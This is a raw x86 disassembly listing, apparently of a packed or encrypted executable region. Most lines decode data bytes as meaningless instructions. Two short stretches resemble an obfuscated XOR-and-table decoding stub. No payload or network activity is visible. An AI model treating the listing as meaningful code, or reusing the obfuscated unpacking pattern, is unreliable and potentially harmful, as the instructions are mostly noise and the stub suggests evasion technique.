  405015:	mov    dl,0x43
  405017:	std    
  405018:	movq   QWORD PTR [esi],mm3
  40501b:	add    DWORD PTR [ebx],esp
  40501d:	(bad)  
  40501e:	sub    eax,0xad871ae9
  405023:	jns    0x405052
  405025:	iret   
  405026:	out    dx,eax
  405027:	pop    eax
  405028:	test   eax,0xc1a0aca5
  40502d:	inc    edi
  40502e:	popa   
  40502f:	mov    BYTE PTR [ebx-0x6b],ah
  405032:	push   edi
  405033:	hlt    
  405034:	pop    esp
  405035:	dec    eax
  405036:	dec    edi
  405037:	test   BYTE PTR [ecx+0x4a],0xbb
  40503b:	mov    dl,0x8e
  40503d:	jle    0x40504b
  40503f:	repz scas al,BYTE PTR es:[edi]
  405041:	shl    DWORD PTR [ebx+edx*4+0x41],1
  405045:	in     eax,0x5f
  405047:	bound  edx,QWORD PTR [ebp+edi*8+0x65adbd0b]
  40504e:	loopne 0x405080
  405050:	test   al,0x84
  405052:	sbb    DWORD PTR [ecx+0xc],ebp
  405055:	add    bh,BYTE PTR [esi+0x51f5eed7]
  40505b:	inc    ebx
  40505c:	cli    
  40505d:	imul   ebx,DWORD PTR [edx+0x45]
  405061:	imul   DWORD PTR [edx-0x6d]
  405064:	fnstcw WORD PTR [edx]
  405066:	js     0x404ff9
  405068:	xacquire xchg BYTE PTR [edx],bl
  40506b:	fst    QWORD PTR [edi+0xb7aae73]
  405071:	repnz sahf 
  405073:	push   eax
  405074:	jae    0x405026
  405076:	fwait
  405077:	xchg   BYTE PTR ds:0x7a17da41,ch
  40507d:	dec    esi
  40507e:	xor    ebp,DWORD PTR [edi-0x80]
  405081:	das    
  405082:	call   0xbe720e34
  405087:	in     eax,dx
  405088:	jne    0x4050a5
  40508a:	dec    esp
  40508b:	div    BYTE PTR [ebx+0x7f6e04ad]
  405091:	add    eax,DWORD PTR [ecx+0x145d8dfc]
  405097:	adc    DWORD PTR [ebp-0x18],ecx
  40509a:	leave  
  40509b:	fldpi  
  40509d:	retf   
  40509e:	sbb    al,0x6
  4050a0:	dec    esi
  4050a1:	pop    ebp
  4050a2:	xchg   ebp,eax
  4050a3:	out    dx,al
  4050a4:	mov    edi,0x95c7245a
  4050a9:	lods   ax,WORD PTR ds:[esi]
  4050ab:	sahf   
  4050ac:	mov    ds:0xe511ca88,eax
  4050b1:	dec    ebp
  4050b2:	push   cs
  4050b3:	xor    al,0xdb
  4050b5:	out    dx,eax
  4050b6:	push   ds
  4050b7:	vpaddb xmm5,xmm7,XMMWORD PTR [esi-0x5e]
  4050bc:	pop    ds
  4050bd:	mov    ds:0x34f61afa,eax
  4050c2:	cli    
  4050c3:	add    eax,0xbf5f374e
  4050c8:	push   0x2bffcd8d
  4050cd:	clc    
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0xd4e1902],bh
  4050fc:	xchg   edi,eax
  4050fd:	call   0x4db8c932
  405102:	jle    0x40517c
  405104:	js     0x4050b6
  405106:	xchg   esp,eax
  405107:	pop    ecx
  405108:	xchg   edi,eax
  405109:	outs   dx,DWORD PTR ds:[esi]
  40510a:	loopne 0x4050e5
  40510c:	jb     0x4050ea
  40510e:	push   0x6e9e81d0
  405113:	lahf   
  405114:	shr    BYTE PTR [ecx+eax*8+0x6c],1
  405118:	push   ds
  405119:	push   esi
  40511a:	add    eax,0x395fd96b
  40511f:	call   0xdc4e:0x8aa5ff2f
  405126:	xchg   ebx,eax
  405127:	fwait
  405128:	sub    ebp,DWORD PTR [ebx+0x36fd6251]
  40512e:	inc    ebx
  40512f:	or     eax,DWORD PTR [esi+0x7]
  405132:	and    eax,0xeaa471c8
  405137:	add    eax,0x5a499c4f
  40513c:	in     al,0x66
  40513e:	fstp   st(6)
  405140:	xchg   edx,eax
  405141:	push   esi
  405142:	pop    esp
  405143:	fist   DWORD PTR [esi-0x44]
  405146:	xor    BYTE PTR [eax+ecx*1],al
  405149:	mov    bh,0x89
  40514b:	pop    fs
  40514d:	fs pushf 
  40514f:	ror    DWORD PTR [edi-0x52],1
  405152:	xchg   ebp,eax
  405153:	jo     0x40516a
  405155:	(bad)  
  405156:	jmp    0xa3950563
  40515b:	int3   
  40515c:	js     0x405177
  40515e:	pop    esp
  40515f:	mov    dl,0xa5
  405161:	pop    eax
  405162:	mov    eax,DWORD PTR [ebx-0x609d9640]
  405168:	hlt    
  405169:	call   0x665e9f03
  40516e:	sub    dh,bl
  405170:	or     ecx,edx
  405172:	pusha  
  405173:	aam    0xea
  405175:	(bad)  
  405176:	std    
  405177:	pop    ds
  405178:	sbb    eax,0xf0162c34
  40517d:	test   BYTE PTR [esi+0x41],dl
  405180:	mov    dl,ah
  405182:	pop    esp
  405183:	mov    cl,0xd1
  405185:	mov    al,0xeb
  405187:	xor    eax,0x1dc95358
  40518c:	dec    ebp
  40518d:	push   es
  40518e:	pushf  
  40518f:	(bad)  
  405191:	jbe    0x40514d
  405193:	nop
  405194:	xlat   BYTE PTR ds:[ebx]
  405195:	mov    edx,0xbc1d27ea
  40519a:	inc    esi
  40519b:	hlt    
  40519c:	dec    ecx
  40519d:	add    bl,bl
  40519f:	mov    ebx,0x773a2c39
  4051a4:	icebp  
  4051a5:	loope  0x4051d7
  4051a7:	call   0x7014:0x1078d39b
  4051ae:	adc    bl,bh
  4051b0:	(bad)  
  4051b1:	rep ins DWORD PTR es:[edi],dx
  4051b3:	enter  0xb6a6,0x12
  4051b7:	mov    ah,0x14
  4051b9:	sti    
  4051ba:	jnp    0x4051d0
  4051bc:	adc    BYTE PTR [ecx-0x34],bh
  4051bf:	add    al,0x3
  4051c1:	jbe    0x405232
  4051c3:	mov    ah,0xd5
  4051c5:	xchg   edi,eax
  4051c6:	(bad)  
  4051c7:	aad    0xe4
  4051c9:	push   cs
  4051ca:	and    edi,DWORD PTR [ebx+0x33]
  4051cd:	cwde   
  4051ce:	or     dh,0xe7
  4051d1:	out    0xe7,al
  4051d3:	sbb    edx,DWORD PTR [ecx-0x33b0e522]
  4051d9:	mov    eax,ds:0x90b1aa05
  4051de:	xor    DWORD PTR ds:0x39704d60,ebx
  4051e4:	jae    0x405174
  4051e6:	xchg   esi,eax
  4051e7:	outs   dx,DWORD PTR ds:[esi]
  4051e8:	sub    ebp,eax
  4051ea:	(bad)  
  4051eb:	pop    ecx
  4051ec:	fsub   QWORD PTR [eax]
  4051ee:	cmp    ah,ch
  4051f0:	mov    ch,0x31
  4051f2:	xor    cl,BYTE PTR [edx-0x2dd8411f]
  4051f8:	fdiv   DWORD PTR [ebx+0x21]
  4051fb:	sub    al,0x64
  4051fd:	nop
  4051fe:	adc    esp,DWORD PTR [ebx-0x35888055]
  405204:	leave  
  405205:	lods   eax,DWORD PTR ds:[esi]
  405206:	outs   dx,BYTE PTR ds:[si]
  405208:	gs out dx,eax
  40520a:	stc    
  40520b:	lods   al,BYTE PTR ds:[esi]
  40520c:	mov    bl,0xa9
  40520e:	jns    0x405242
  405210:	imul   DWORD PTR [ebp-0xf7e4cd9]
  405216:	loope  0x4051b0
  405218:	ja     0x405216
  40521a:	out    0x91,eax
  40521c:	sti    
  40521d:	test   BYTE PTR [esi],al
  40521f:	cmp    DWORD PTR [edi+0x68],0x2f
  405223:	ss fsub st(0),st
  405226:	push   0xffffffc9
  405228:	inc    ecx
  405229:	push   edi
  40522a:	call   DWORD PTR [eax]
  40522c:	xor    DWORD PTR [edi+0x3a],esi
  40522f:	push   0x98312383
  405234:	in     al,dx
  405235:	inc    edi
  405236:	dec    ebx
  405237:	ja     0x4051de
  405239:	or     DWORD PTR [eax+0x1c],eax
  40523c:	jle    0x4051c8
  40523e:	cmp    al,0xaa
  405240:	dec    ecx
  405241:	outs   dx,BYTE PTR ds:[esi]
  405242:	clc    
  405243:	shr    DWORD PTR [ebp+0x249835cf],cl
  405249:	les    ecx,FWORD PTR [esi]
  40524b:	adc    eax,0xac8cd248
  405250:	cmp    dl,BYTE PTR ss:[ebx+0x36]
  405254:	jl     0x4051d6
  405256:	out    dx,eax
  405257:	xchg   esp,eax
  405258:	pop    ds
  405259:	dec    esi
  40525a:	fsubr  DWORD PTR [ebp+0x79e98b23]
  405260:	(bad)  
  405261:	mov    ecx,0x9c52cdd6
  405266:	mov    edx,0x9bb6f4
  40526b:	adc    al,0x72
  40526d:	jmp    0x4051f5
  40526f:	mov    al,ds:0x61317ea1
  405274:	inc    edx
  405275:	out    0xc0,al
  405277:	pushf  
  405278:	cmp    ebp,ebp
  40527a:	sbb    BYTE PTR [ebx+0x6b406548],0x1a
  405281:	ins    DWORD PTR es:[edi],dx
  405282:	push   0xffffff9d
  405284:	lock sub DWORD PTR [ecx-0x5689838],0xfffffffa
  40528c:	push   eax
  40528d:	mov    eax,ds:0xbdd8fb0f
  405292:	xchg   BYTE PTR [eax],bl
  405294:	add    dh,BYTE PTR [edx]
  405296:	rcl    BYTE PTR [ebx],1
  405298:	cmc    
  405299:	lods   eax,DWORD PTR ds:[esi]
  40529a:	dec    esi
  40529b:	cmp    al,0xc0
  40529d:	mov    BYTE PTR [edi-0x75dad345],dl
  4052a3:	sub    eax,0x92e55f89
  4052a8:	stos   BYTE PTR es:[edi],al
  4052a9:	retf   0xa935
  4052ac:	add    DWORD PTR [edi-0x31],eax
  4052af:	xor    eax,0xa0e27cf4
  4052b4:	ss fdivr st,st(6)
  4052b7:	mov    esp,DWORD PTR [ecx-0x45e7620d]
  4052bd:	cmp    DWORD PTR [ebp+0x38],eax
  4052c0:	xor    al,al
  4052c2:	and    eax,0xe06befc
  4052c7:	lds    edx,FWORD PTR [ebx+0xa]
  4052ca:	xchg   BYTE PTR [edi-0x50e27ee9],al
  4052d0:	jg     0x405309
  4052d2:	add    edx,DWORD PTR [eax-0x60]
  4052d5:	xor    DWORD PTR [edx+0x478e1634],0xf255446f
  4052df:	or     eax,DWORD PTR [esi-0x1f]
  4052e2:	mov    eax,ds:0xb9dbbfed
  4052e7:	cld    
  4052e8:	sub    ebx,DWORD PTR [edx+0x59af4ffa]
  4052ee:	out    0x96,eax
  4052f0:	cmp    DWORD PTR [ecx+eiz*8+0x40bcd0ee],edi
  4052f7:	dec    esp
  4052f8:	mov    cl,0xad
  4052fa:	sub    BYTE PTR [esi],ah
  4052fc:	or     eax,eax
  4052fe:	mul    DWORD PTR [edx-0x60682aea]
  405304:	mov    esp,edx
  405306:	lahf   
  405307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405308:	jecxz  0x405316
  40530a:	mov    dl,0x66
  40530c:	iret   
  40530d:	or     BYTE PTR [ebp+0x450822c5],dh
  405313:	pop    ds
  405314:	mov    eax,0xd6c0d766
  405319:	aam    0xbb
  40531b:	sub    eax,0xb34978d6
  405320:	gs pop es
  405322:	into   
  405323:	and    al,0x6f
  405325:	push   esi
  405326:	fisttp DWORD PTR [ecx]
  405328:	repnz cmp dh,BYTE PTR [esi-0x2a]
  40532c:	mov    eax,ds:0xcd15e4dd
  405331:	mov    al,0x18
  405333:	sti    
  405334:	das    
  405335:	add    esp,edi
  405337:	and    eax,0x5033281c
  40533c:	sub    BYTE PTR [eax+0x3b88adbc],dl
  405342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405343:	test   DWORD PTR [ebp+0x5e],esp
  405346:	xor    al,0x7c
  405348:	cmp    edi,DWORD PTR [ebp+0x3a2adaa3]
  40534e:	push   ecx
  40534f:	(bad)  
  405351:	mov    al,0xe2
  405353:	or     edx,DWORD PTR [eax-0x2d]
  405356:	in     al,dx
  405357:	fidivr WORD PTR [ecx]
  405359:	out    0xbd,al
  40535b:	push   edi
  40535c:	sbb    ecx,ecx
  40535e:	imul   edi,DWORD PTR [eax-0x371566b9],0x5e
  405365:	pusha  
  405366:	mov    edx,DWORD PTR [ebx]
  405368:	sahf   
  405369:	data16 das 
  40536b:	xchg   ecx,eax
  40536c:	inc    ebx
  40536d:	js     0x40531a
  40536f:	inc    ebp
  405370:	adc    BYTE PTR [ebx],ch
  405372:	sbb    esp,edx
  405374:	js     0x40533a
  405376:	das    
  405377:	lea    eax,[ebx-0x2e]
  40537a:	mov    bh,BYTE PTR [ecx+0xc]
  40537d:	xchg   edi,eax
  40537e:	lds    edx,FWORD PTR [ebp-0x49]
  405381:	mov    WORD PTR ds:[edi-0x5a],?
  405385:	xchg   DWORD PTR [ebx+eax*2+0xf],esi
  405389:	setno  BYTE PTR [edi+ebp*2]
  40538d:	das    
  40538e:	xchg   ebx,eax
  40538f:	int    0x8e
  405391:	(bad)  
  405392:	sar    BYTE PTR [edi-0x65],cl
  405395:	mov    bh,0x2e
  405397:	pop    ss
  405398:	cmp    ecx,DWORD PTR [eax]
  40539a:	popf   
  40539b:	(bad)  
  40539c:	pop    edi
  40539d:	or     edx,esp
  40539f:	shr    BYTE PTR gs:[edx],0xa7
  4053a3:	(bad)  
  4053a4:	ds add al,0xb5
  4053a7:	sub    DWORD PTR [esi+0x65],edi
  4053aa:	jae    0x4053ac
  4053ac:	add    al,0x2f
  4053ae:	and    al,0xf5
  4053b0:	pushf  
  4053b1:	add    al,BYTE PTR [edx+0x5e]
  4053b4:	ret    
  4053b5:	fstp   TBYTE PTR [edx]
  4053b7:	ss aaa 
  4053b9:	pop    ss
  4053ba:	mov    bh,0x8f
  4053bc:	fidiv  DWORD PTR [edi-0x3c]
  4053bf:	clc    
  4053c0:	inc    edi
  4053c1:	or     eax,0xd5480d77
  4053c6:	push   es
  4053c7:	xchg   edx,eax
  4053c8:	fcmove st,st(4)
  4053ca:	or     DWORD PTR [eax-0x4a],eax
  4053cd:	mov    ds:0x22bbf22b,al
  4053d2:	mov    BYTE PTR [eax],dh
  4053d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053d5:	and    DWORD PTR [eax-0x7ba74d5],eax
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsubr  st(3),st
  4053ed:	daa    
  4053ee:	mov    dh,0xdc
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x4053f5
  4053f9:	dec    ebx
  4053fa:	pop    ss
  4053fb:	mov    bl,bh
  4053fd:	xchg   esi,eax
  4053fe:	inc    ebp
  4053ff:	xor    eax,0xed4e3de5
  405404:	push   esp
  405405:	fwait
  405406:	mov    edi,0xaefdc72b
  40540b:	dec    ecx
  40540c:	pop    edx
  40540d:	jb     0x4053df
  40540f:	add    al,0xa2
  405411:	icebp  
  405412:	jb     0x4053d2
  405414:	fs inc edx
  405416:	retf   0x9321
  405419:	jmp    0x34be:0x92544a87
  405420:	jne    0x405451
  405422:	push   cs
  405423:	or     edi,DWORD PTR [eax+edi*2]
  405426:	arpl   WORD PTR [ebx-0x75],cx
  405429:	nop
  40542a:	imul   ebp,DWORD PTR [edi],0x5c30ff5e
  405430:	dec    ebp
  405431:	mov    edx,0x2e094dc4
  405436:	shl    ch,cl
  405438:	repnz popf 
  40543a:	cmp    al,0x4c
  40543c:	arpl   ax,si
  40543e:	fwait
  40543f:	aad    0x7
  405441:	jns    0x4054bd
  405443:	out    0xbd,al
  405445:	mov    ds:0x592ad789,eax
  40544a:	call   0x1e726b2
  40544f:	outs   dx,BYTE PTR ds:[esi]
  405450:	aad    0xd0
  405452:	cmp    al,BYTE PTR [bp+di+0x2cb0]
  405457:	or     dh,0xd
  40545a:	xor    DWORD PTR [ecx+0xe],ebx
  40545d:	test   eax,0x99cce9a7
  405462:	pop    edx
  405463:	and    BYTE PTR [edx-0x2d],0x29
  405467:	push   0xf8f8bbc
  40546c:	push   ds
  40546d:	xor    eax,0xb0d6dc68
  405472:	out    dx,eax
  405473:	sbb    DWORD PTR [edx],esi
  405475:	adc    eax,0x610da253
  40547a:	xor    ah,bh
  40547c:	cdq    
  40547d:	int3   
  40547e:	and    BYTE PTR [edx+0x21],0x96
  405482:	out    dx,eax
  405483:	(bad)  
  405484:	bound  ebx,QWORD PTR [edx]
  405486:	icebp  
  405487:	(bad)  
  405488:	xchg   ebx,eax
  405489:	in     al,0xd4
  40548b:	test   BYTE PTR [ebx+0x5],bh
  40548e:	ja     0x405416
  405490:	add    BYTE PTR [esi-0x17bfac2e],bl
  405496:	stc    
  405497:	out    0xb7,al
  405499:	pop    ebx
  40549a:	mov    dh,BYTE PTR [edi+0x2220bf5f]
  4054a0:	inc    ecx
  4054a1:	lock lock hlt 
  4054a4:	inc    edx
  4054a5:	push   cs
  4054a6:	aad    0xa
  4054a8:	dec    eax
  4054a9:	data16 mov dh,0xdc
  4054ac:	out    0x1d,eax
  4054ae:	lea    esi,[ebx+ebx*1-0x36ddb923]
  4054b5:	leave  
  4054b6:	push   esi
  4054b7:	sbb    esp,DWORD PTR [edi-0x2d]
  4054ba:	dec    DWORD PTR [edx]
  4054bc:	icebp  
  4054bd:	loopne 0x40548d
  4054bf:	out    dx,eax
  4054c0:	jo     0x405518
  4054c2:	cmp    DWORD PTR [edi-0x3a],esp
  4054c5:	adc    al,0xa7
  4054c7:	ret    0xe16c
  4054ca:	test   al,0x3b
  4054cc:	or     al,0x89
  4054ce:	lock bound esi,QWORD PTR [eax+0x16]
  4054d2:	vmovupd YMMWORD PTR [eax],ymm4
  4054d6:	ds xchg cl,ah
  4054d9:	neg    edx
  4054db:	add    dl,bh
  4054dd:	fst    st(1)
  4054df:	leave  
  4054e0:	pop    ebp
  4054e1:	pop    ss
  4054e2:	and    eax,0x6bd61679
  4054e7:	cmc    
  4054e8:	repnz mov cl,0xbe
  4054eb:	repnz or BYTE PTR [esp+esi*2+0x2a],ah
  4054f0:	xchg   edi,eax
  4054f1:	adc    DWORD PTR [esi-0x51],edx
  4054f4:	shl    edx,1
  4054f6:	pop    eax
  4054f7:	lock lahf 
  4054f9:	setne  dl
  4054fc:	dec    BYTE PTR [bx+di]
  4054ff:	jbe    0x4054fe
  405501:	ss cld 
  405503:	xor    al,0x99
  405505:	mov    ebx,0x55cb36a3
  40550a:	adc    ebp,0x68
  40550d:	sahf   
  40550e:	sbb    ebx,DWORD PTR [edi-0x509f190]
  405514:	mov    al,ds:0x9e7d0113
  405519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40551a:	pop    ds
  40551b:	mov    dh,0x2e
  40551d:	or     al,0xbe
  40551f:	mov    cl,0x0
  405521:	outs   dx,DWORD PTR es:[esi]
  405523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405524:	jle    0x405595
  405526:	sub    eax,0xedac8305
  40552b:	or     ebp,DWORD PTR [edi+0x2bb6585d]
  405531:	xchg   ecx,eax
  405532:	stos   BYTE PTR es:[edi],al
  405533:	cli    
  405534:	sti    
  405535:	mov    al,0x74
  405537:	ins    BYTE PTR es:[edi],dx
  405538:	sub    eax,0x5ef1d7f
  40553d:	cs cdq 
  40553f:	adc    eax,DWORD PTR [ebp+0x10]
  405542:	pop    es
  405543:	cli    
  405544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405545:	call   0x58ce3f72
  40554a:	fidiv  WORD PTR [edi]
  40554c:	sbb    BYTE PTR [esi+0x3c],0x6e
  405550:	mov    ebx,0x5252913e
  405555:	aam    0xd8
  405557:	add    al,0xd0
  405559:	and    DWORD PTR [eax],esp
  40555b:	sbb    eax,0x572f1d79
  405560:	les    ecx,FWORD PTR [esi+0x0]
  405563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405564:	adc    ch,BYTE PTR [esi]
  405566:	xchg   ebp,eax
  405567:	(bad)  
  405568:	cmp    dh,BYTE PTR [ebx-0x70fc9f95]
  40556e:	mov    dh,0xb2
  405570:	mov    WORD PTR [eax+ebp*8-0x3bff5370],fs
  405577:	test   BYTE PTR ds:0x34350df6,0xad
  40557e:	jbe    0x4055ac
  405580:	cwde   
  405581:	pop    esp
  405582:	(bad)  
  405583:	pop    esp
  405584:	iret   
  405585:	add    BYTE PTR [ebx+edx*1+0x63],ah
  405589:	push   ss
  40558a:	jp     0x40550d
  40558c:	in     eax,dx
  40558d:	dec    ebx
  40558e:	fs inc esi
  405590:	out    0x4,al
  405592:	js     0x4055e2
  405594:	and    BYTE PTR [ebx+0x5f589756],bh
  40559a:	shr    ebp,cl
  40559c:	iret   
  40559d:	jbe    0x4055fd
  40559f:	jne    0x4055f0
  4055a1:	cld    
  4055a2:	mov    edx,0x76d913ee
  4055a7:	and    BYTE PTR [esi],ch
  4055a9:	or     BYTE PTR [esi-0x4e],ah
  4055ac:	mov    eax,0x15fa3b25
  4055b1:	mov    ebx,0xe675cc51
  4055b6:	inc    ebp
  4055b7:	in     eax,dx
  4055b8:	in     eax,0xe7
  4055ba:	adc    eax,edi
  4055bc:	fcmovne st,st(0)
  4055be:	xchg   edx,eax
  4055bf:	sar    DWORD PTR [esi],1
  4055c1:	into   
  4055c2:	cmp    cl,ah
  4055c4:	mov    al,ds:0x4c474a
  4055c9:	dec    edx
  4055ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055cb:	inc    esi
  4055cc:	fnsave [esi-0x2da7ff50]
  4055d2:	add    al,0x35
  4055d4:	clc    
  4055d5:	or     BYTE PTR [ebx-0x6a],cl
  4055d8:	adc    eax,0xe86345c1
  4055dd:	and    ch,ch
  4055df:	repz push 0x140237c9
  4055e5:	xchg   esi,eax
  4055e6:	push   edi
  4055e7:	in     al,0xff
  4055e9:	dec    ebx
  4055ea:	jmp    0x56fb900a
  4055ef:	inc    esi
  4055f0:	or     ebp,DWORD PTR [ebx]
  4055f2:	ret    
  4055f3:	jg     0x4055aa
  4055f5:	rcl    DWORD PTR [edi+0x5c],0xc5
  4055f9:	adc    esp,0xffffff8f
  4055fc:	(bad)  
  4055fd:	enter  0x65b5,0xd
  405601:	jnp    0x4055be
  405603:	(bad)  
  405604:	fcom   DWORD PTR [edi]
  405606:	inc    eax
  405607:	add    al,BYTE PTR [edx-0x71]
  40560a:	daa    
  40560b:	jbe    0x4055b7
  40560d:	mov    BYTE PTR [edi+0x226ad59c],dl
  405613:	jnp    0x1dec2f0f
  405619:	test   eax,0xa3971206
  40561e:	adc    al,0xd0
  405620:	jne    0x40568e
  405622:	icebp  
  405623:	daa    
  405624:	std    
  405625:	dec    eax
  405626:	div    BYTE PTR [edx]
  405628:	mov    cl,0xeb
  40562a:	scas   al,BYTE PTR es:[edi]
  40562b:	or     cl,0xb9
  40562e:	cwde   
  40562f:	fs inc edi
  405631:	mov    ebp,0x7d3c58dc
  405636:	mov    eax,ds:0xda4138c5
  40563b:	shr    BYTE PTR [edx],0x24
  40563e:	arpl   WORD PTR [ecx+0x15],bx
  405641:	or     eax,0xc11ff310
  405646:	add    al,0xeb
  405648:	or     al,0x0
  40564a:	jb     0x405601
  40564c:	inc    ebx
  40564d:	int3   
  40564e:	push   0x661a1b9e
  405653:	or     esp,DWORD PTR [ecx+0x6a]
  405656:	mov    eax,ds:0xb6ee96e0
  40565b:	jmp    0x405619
  40565d:	mov    ds:0x51fe1bc1,eax
  405662:	push   es
  405663:	adc    DWORD PTR [edi-0x6cc84fd8],0xffffff90
  40566a:	scas   eax,DWORD PTR es:[edi]
  40566b:	sub    BYTE PTR [ebx-0x8aaf91e],ah
  405671:	jl     0x405631
  405673:	ficom  WORD PTR [ebx-0x7e19ae42]
  405679:	cwde   
  40567a:	xchg   DWORD PTR [esi+0xd],ebp
  40567d:	ds xchg ecx,eax
  40567f:	int3   
  405680:	lds    ebx,FWORD PTR [ebx+0x3c]
  405683:	jmp    0xe5f7:0x99f01860
  40568a:	add    BYTE PTR [ebx+0x19],0x76
  40568e:	lock and eax,0xbc1f822f
  405694:	adc    DWORD PTR [ebp+0x78],0xb1d66770
  40569b:	inc    DWORD PTR [ecx-0x297e42e7]
  4056a1:	push   esp
  4056a2:	cmp    eax,0x11f1c6f3
  4056a7:	or     DWORD PTR [ebx+0x73],eax
  4056aa:	mov    eax,0xaf93340b
  4056af:	mov    DWORD PTR [ecx+0x32288401],ebx
  4056b5:	es aam 0xe9
  4056b8:	mov    al,ds:0xad19806e
  4056bd:	or     cl,BYTE PTR [eax+0x4057e54e]
  4056c3:	das    
  4056c4:	push   ebp
  4056c5:	mov    ebx,0xd43932ed
  4056ca:	xchg   ebp,eax
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	push   eax
  405713:	mov    BYTE PTR [edi],dh
  405715:	sbb    edx,DWORD PTR [edx]
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x40570a
  40571f:	scas   eax,DWORD PTR es:[edi]
  405720:	int3   
  405721:	sti    
  405722:	xchg   ecx,eax
  405723:	std    
  405724:	fimul  WORD PTR [edx]
  405726:	scas   al,BYTE PTR es:[edi]
  405727:	outs   dx,DWORD PTR ds:[esi]
  405728:	pop    ebp
  405729:	ins    DWORD PTR es:[edi],dx
  40572a:	cmc    
  40572b:	test   eax,0x48fd3d26
  405730:	out    0x95,al
  405732:	cmp    eax,0x88499293
  405737:	(bad)  
  405739:	cld    
  40573a:	out    0xa1,al
  40573c:	outs   dx,BYTE PTR ds:[esi]
  40573d:	cmp    dl,al
  40573f:	popa   
  405740:	dec    ebx
  405741:	mov    ecx,0x6cf4efc4
  405746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405747:	js     0x40578e
  405749:	sbb    DWORD PTR [ecx+0x4b],esp
  40574c:	or     eax,0xc98b759
  405751:	cs popa 
  405753:	retf   0x5f4e
  405756:	shr    bh,1
  405758:	repnz lock adc ecx,eax
  40575c:	pop    esi
  40575d:	sbb    DWORD PTR [ecx+0x7f],eax
  405760:	loopne 0x4057cb
  405762:	mov    edi,0xd0e52d72
  405767:	add    eax,ebp
  405769:	out    0x4f,al
  40576b:	nop
  40576c:	xor    esp,DWORD PTR [edi-0x7e]
  40576f:	push   0xd94af97a
  405774:	fcomip st,st(1)
  405776:	mov    esp,0xa7703f6f
  40577b:	bnd jbe 0x4057ce
  40577e:	pop    edx
  40577f:	xchg   ebp,eax
  405780:	pop    ds
  405781:	cli    
  405782:	call   0xfe5b36c4
  405787:	out    0x51,al
  405789:	ret    0x5487
  40578c:	call   0xa788:0xfca0d60e
  405793:	xchg   edi,eax
  405794:	out    0x3f,al
  405796:	ja     0x405799
  405798:	inc    edx
  405799:	jne    0x4057b1
  40579b:	jmp    0x40576b
  40579d:	pop    DWORD PTR ds:0xce79503e
  4057a3:	push   ss
  4057a4:	cmp    al,ch
  4057a6:	push   edx
  4057a7:	mov    al,ds:0xb5f9e422
  4057ac:	rol    DWORD PTR [edi+0x11],0x4f
  4057b0:	jne    0x40582f
  4057b2:	sub    al,0x76
  4057b4:	or     ah,BYTE PTR [edi+esi*1-0x52b96d7]
  4057bb:	xor    DWORD PTR [eax+0x10e3c78],0xa3deb2c9
  4057c5:	outs   dx,DWORD PTR ds:[esi]
  4057c6:	mov    dl,BYTE PTR [ecx-0x28]
  4057c9:	xor    bl,bh
  4057cb:	mov    al,BYTE PTR [ebx]
  4057cd:	into   
  4057ce:	outs   dx,DWORD PTR ds:[esi]
  4057cf:	jecxz  0x405784
  4057d1:	nop
  4057d2:	js     0x4057d2
  4057d4:	mov    ds:0x839c53c4,al
  4057d9:	or     DWORD PTR [esi+0x24f300b6],0x227410e
  4057e3:	mov    es,WORD PTR [edi]
  4057e5:	arpl   WORD PTR [esp+ecx*8+0x325c9d4a],dx
  4057ec:	xchg   edi,eax
  4057ed:	cli    
  4057ee:	sbb    dl,bh
  4057f0:	scas   eax,DWORD PTR es:[edi]
  4057f1:	(bad)  
  4057f3:	std    
  4057f4:	cmp    al,0x1c
  4057f6:	(bad)  
  4057f7:	fsubr  QWORD PTR [esi-0x4fc35ca7]
  4057fd:	sbb    eax,0x7c807870
  405802:	mov    ah,0xb4
  405804:	out    dx,al
  405805:	daa    
  405806:	add    DWORD PTR [edx-0x1],eax
  405809:	sbb    eax,0x389a1749
  40580e:	push   ss
  40580f:	fisub  WORD PTR [edx-0x74e187c1]
  405815:	lahf   
  405816:	push   ds
  405817:	mov    edx,0xe982def8
  40581d:	aaa    
  40581e:	repnz and al,cl
  405821:	xor    esi,esp
  405823:	inc    esp
  405824:	add    DWORD PTR [esi],esi
  405826:	fisub  DWORD PTR ds:0xe2309bef
